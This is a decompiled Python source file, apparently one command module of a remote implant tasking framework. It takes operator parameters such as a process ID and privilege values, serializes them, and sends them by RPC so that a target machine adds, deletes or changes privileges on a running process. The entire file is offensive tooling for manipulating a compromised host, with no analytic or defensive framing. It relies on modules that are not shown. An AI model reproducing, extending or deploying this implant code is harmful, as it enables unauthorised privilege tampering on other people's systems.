# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_ProcessModify_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processmodify', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processmodify.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.process.cmd.processmodify.Params()
    tgtParams.type = lpParams['type']
    tgtParams.pid = lpParams['pid']
    tgtParams.newAttributes = lpParams['attributes']
    tgtParams.changeAttributes = lpParams['change']
    if lpParams['orig'] != None:
        tgtParams.origValue = lpParams['orig']
    if lpParams['new'] != None:
        tgtParams.newValue = lpParams['new']
    if len(tgtParams.origValue) == 0 or len(tgtParams.newValue) == 0:
        mcl.tasking.OutputError('An original and new value must be specified')
        return False
    else:
        if tgtParams.newValue == '_action_add':
            if tgtParams.type != mca.process.cmd.processmodify.PARAMS_TYPE_CHANGE_PRIVILEGE:
                mcl.tasking.OutputError('Only privileges may be added')
                return False
            tgtParams.type = mca.process.cmd.processmodify.PARAMS_TYPE_ADD_PRIVILEGE
            tgtParams.newValue = ''
        else:
            if tgtParams.newValue == '_action_delete':
                if tgtParams.type != mca.process.cmd.processmodify.PARAMS_TYPE_CHANGE_PRIVILEGE:
                    mcl.tasking.OutputError('Only privileges may be deleted')
                    return False
                tgtParams.type = mca.process.cmd.processmodify.PARAMS_TYPE_DELETE_PRIVILEGE
                tgtParams.newValue = ''
            rpc = mca.process.cmd.processmodify.tasking.RPC_INFO_MODIFY
            msg = MarshalMessage()
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
            rpc.SetMessagingType('message')
            res = mcl.tasking.RpcPerformCall(rpc)
            if res != mcl.target.CALL_SUCCEEDED:
                mcl.tasking.RecordModuleError(res, 0, mca.process.cmd.processmodify.errorStrings)
                return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)